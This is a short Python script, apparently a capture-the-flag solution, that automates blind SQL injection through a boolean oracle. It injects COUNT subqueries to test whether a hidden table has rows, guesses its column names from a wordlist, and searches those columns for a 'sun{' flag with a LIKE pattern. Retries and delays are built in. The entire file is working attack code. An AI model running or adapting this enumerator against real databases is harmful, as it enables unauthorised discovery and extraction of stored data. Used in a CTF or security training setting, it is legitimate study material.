"""Given the hidden table, find which column carries the flag (1 query per hypothesis)."""
import sys
import time
from oracle import ask

GAP = 2.0
COLS = ["id", "name", "designation", "telemetry", "signature", "sig", "data", "payload",
        "value", "content", "note", "notes", "hidden", "secret", "flag", "token",
        "class", "type", "status", "clearance", "restricted", "code", "hint",
        "message", "text", "body", "extra", "meta", "internal", "admin", "raw",
        "reading", "signal", "carrier", "broadcast", "transmission", "record"]


def ask2(e, tries=3):
    for _ in range(tries):
        if ask(e):
            return True
        time.sleep(1.0)
    return False


tbl = sys.argv[1] if len(sys.argv) > 1 else open("hidden_table.txt").read().strip()
print("table = %r" % tbl, flush=True)
print("rows  = %s" % ask2("(SELECT COUNT(*) FROM %s)>0" % tbl), flush=True)
found = []
for c in COLS:
    t = time.time()
    ok = ask2("(SELECT COUNT(%s) FROM %s)>=0" % (c, tbl))
    print("  col %-16s %s (%.0fs)" % (c, ok, time.time() - t), flush=True)
    if ok:
        found.append(c)
    time.sleep(GAP)
print("columns:", found, flush=True)

for c in found:
    hit = ask2("(SELECT COUNT(*) FROM %s WHERE %s::text LIKE '%%sun{%%')>0" % (tbl, c))
    print("  %-16s holds sun{ : %s" % (c, hit), flush=True)
    time.sleep(GAP)
